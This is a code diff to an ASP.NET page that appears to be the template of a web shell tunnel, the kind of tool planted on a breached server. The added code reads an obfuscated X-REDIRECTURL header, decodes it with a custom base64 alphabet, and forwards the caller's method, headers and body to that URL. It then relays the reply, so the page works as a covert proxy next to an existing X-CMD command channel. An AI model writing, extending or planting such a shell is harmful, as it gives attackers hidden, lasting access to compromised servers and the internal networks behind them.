@@ -1,4 +1,5 @@
 <%@ Page Language="C#" EnableSessionState="True"%>
+<%@ Import Namespace="System.IO" %>
 <%@ Import Namespace="System.Net" %>
 <%@ Import Namespace="System.Net.Sockets" %>
 <%@ Import Namespace="System.Collections" %>
@@ -18,9 +19,51 @@
 <%
     try
     {
-        Response.StatusCode = HTTPCODE;
         String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
         String de = "BASE64 CHARSLIST";
+        String rUrl = Request.Headers.Get("X-REDIRECTURL");
+        if (rUrl != null){
+            Uri u = new Uri(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(StrTr(rUrl, de, en))));
+            WebRequest request = WebRequest.Create(u);
+            request.Method = Request.HttpMethod;
+            
+            foreach (string key in Request.Headers)
+            {
+                if (key != "X-REDIRECTURL"){
+                    try{
+                        request.Headers.Add(key, Request.Headers.Get(key));
+                    } catch (Exception e){}
+                }
+            }
+
+            int buffLen = Request.ContentLength;
+            byte[] buff = new byte[buffLen];
+            int c = 0;
+            if((c = Request.InputStream.Read(buff, 0, buff.Length)) > 0) {
+                System.Text.Encoding.Default.GetString(buff);
+                try{
+                    Stream body = request.GetRequestStream();
+                    body.Write(buff, 0, buff.Length);
+                    body.Close();
+                } catch (Exception e){}
+            }
+
+            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+            WebHeaderCollection webHeader = response.Headers;
+            for (int i=0;i < webHeader.Count; i++)
+            {
+                string rkey = webHeader.GetKey(i);
+                if (rkey != "Content-Length" && rkey != "Transfer-Encoding")
+                    Response.AddHeader(rkey, webHeader[i]);
+            }
+
+            StreamReader repBody = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding("UTF-8"));
+            string rbody = repBody.ReadToEnd();
+            Response.AddHeader("Content-Length", rbody.Length.ToString());
+            Response.Write(rbody);
+            return;
+        }
+        Response.StatusCode = HTTPCODE;
         String cmd = Request.Headers.Get("X-CMD");
         if (cmd != null) {
             String mark = cmd.Substring(0,22);
